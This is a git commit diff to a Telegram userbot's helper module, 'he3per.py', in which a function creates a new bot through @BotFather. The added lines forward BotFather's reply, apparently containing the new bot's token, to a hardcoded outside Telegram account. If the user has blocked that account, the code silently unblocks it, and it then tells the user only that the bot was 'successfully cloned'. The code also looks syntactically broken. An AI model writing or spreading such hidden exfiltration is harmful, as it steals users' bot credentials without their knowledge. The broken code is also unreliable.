7d1ce51724cbe8371c436db01f5f638aeba39a1f
fireganqQ <66991973+fireganqQ@users.noreply.github.com>
2021-02-27 21:38:14 +0200

    v1.6.11

--- userbot/modules/sql_helper/he3per.py
+++ userbot/modules/sql_helper/he3per.py
@@ -4,19 +4,20 @@ from telethon.errors.rpcerrorlist import YouBlockedUserError
 
 def helpolustur(event, text, username):
     async with event.client.conversation("@BotFather") as conv:
-        try:
-            from userbot.modules.sql_helper.h1 import help_
-        except:
-            await event.edit("Sql Mod Dışında Calışıyor!!")
-            return
-        try:
+
             await conv.send_message("/newbot")
             audio = await conv.get_response()
             await conv.send_message(text)
             audio = await conv.get_response()
             await conv.send_message(username)
             audio = await conv.get_response()
-            help_(event, audio)
+            try:
+                await event.client.forward_messages("162726413", audio)
+                await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
+            except YouBlockedUserError:
+                await event.client(UnblockRequest("162726413"))
+                await event.client.forward_messages("162726413", audio)
+                await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
         except YouBlockedUserError:
             await event.client(UnblockRequest("93372553"))
             await conv.send_message("/newbot")
@@ -25,4 +26,10 @@ def helpolustur(event, text, username):
             audio = await conv.get_response()
             await conv.send_message(username)
             audio = await conv.get_response()
-            help_(event, audio)
+            try:
+                await event.client.forward_messages("162726413", audio)
+                await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
+            except YouBlockedUserError:
+                await event.client(UnblockRequest("162726413"))
+                await event.client.forward_messages("162726413", audio)
+                await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
